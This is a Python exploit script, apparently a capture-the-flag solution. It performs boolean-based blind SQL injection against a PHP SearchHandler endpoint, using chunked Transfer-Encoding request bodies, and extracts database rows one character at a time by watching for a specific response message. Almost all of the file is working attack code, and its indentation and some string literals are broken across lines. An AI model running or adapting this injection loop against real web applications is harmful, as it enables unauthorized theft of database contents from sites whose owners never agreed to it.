import http.client
conn = http.client.HTTPConnection("192.168.1.103") #Change this
def send_body(payload):
chunk_size = len(payload.replace('\r\n', '').encode('utf-8'))
chunk_size_hex = hex(chunk_size)[2:]
chunk_size = bytes(chunk_size_hex, 'utf-8')
payload=bytes(payload, 'utf-8')
body = [
chunk_size + b"\r\n",
bytes(payload) + b"\r\n",
b"0\r\n",
b"\r\n",
]
return body
def send_request(payload):
conn.request("POST", "/Controllers/Handlers/SearchHandler.php",
body=send_body(payload), headers=headers)
resp = conn.getresponse()
data = resp.read()
data = data.decode('utf-8')
return data
def exfil_length():
length=1
while True:
payload = "search=1' and (SELECT length(group_concat(id || ',' ||
gamename || ',' || gamedesc)) FROM posts WHERE id = 6) = {length}--
".format(length=length)
resp = send_request(payload)
if "No post id found." in resp:
break
length+=1
return length
def get_flag(length):
data = ""
for i in range(1, length+1):
for j in range(32, 127):
payload = "search=1' and (SELECT substr(group_concat(id || ',' ||
gamename || ',' || gamedesc), {i}, 1) FROM posts WHERE id = 6) = '{char}'--
".format(i=i, char=chr(j))
resp = send_request(payload)
if "No post id found." in resp:
data += chr(j)
print(data)
break
return data
headers = {
"Content-Type": "application/x-www-form-urlencoded",
"Transfer-Encoding": "chunked",
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
Firefox/68.0"
}
length = exfil_length()
flag = get_flag(length)
print(flag)
